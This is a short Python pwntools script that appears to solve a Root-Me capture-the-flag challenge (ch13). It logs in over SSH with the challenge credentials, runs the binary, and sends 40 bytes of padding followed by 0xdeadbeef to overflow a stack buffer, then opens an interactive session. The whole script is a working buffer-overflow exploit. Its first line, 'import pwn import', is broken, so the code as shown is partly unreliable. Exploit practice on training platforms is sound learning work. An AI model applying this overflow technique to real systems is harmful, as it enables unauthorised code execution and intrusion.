import pwn import 

#context.binary = ELF('./ch13')
context.log_level = 'debug'

#p = remote(host='challenge02.root-me.org',user='app-systeme-ch13',password='app-systeme-ch13',port=2222)

s = ssh(host='challenge02.root-me.org',user='app-systeme-ch13',password='app-systeme-ch13',port=2222)
p = s.process(executable='./ch13')


offset = 40
target = 0xdeadbeef
payload = b'A' * offset + p32(target)

p.send(payload)

p.interactive()
